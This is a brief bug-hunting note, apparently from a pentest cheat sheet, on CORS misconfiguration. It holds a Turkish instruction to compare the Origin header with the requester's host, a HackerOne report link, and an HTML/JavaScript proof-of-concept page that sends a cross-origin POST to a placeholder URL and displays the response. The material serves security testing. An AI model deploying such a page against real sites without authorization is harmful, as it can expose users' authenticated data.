# Cors-Origin

Uygulamanın "Origin" HTTP üstbilgisinin değerinin, gelen HTTP isteğini gönderenin uzak IP adresi / Ana Bilgisayarı değeriyle tutarlı olup olmadığını kontrol edin.


```
SENSITIVE_METHODS = ('PUT', 'DELETE')
COMMON_METHODS = ('POST', 'GET', 'OPTIONS', 'PUT', 'DELETE')
```

Good example from H1
https://hackerone.com/reports/235200

### Post based CORS Misconfiguration PoC

```
<html>
<script>
var http = new XMLHttpRequest();
var url = 'Url';//Paste here Url
var params = 'PostData';//Paste here POST data
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);

</script>
</html>
```
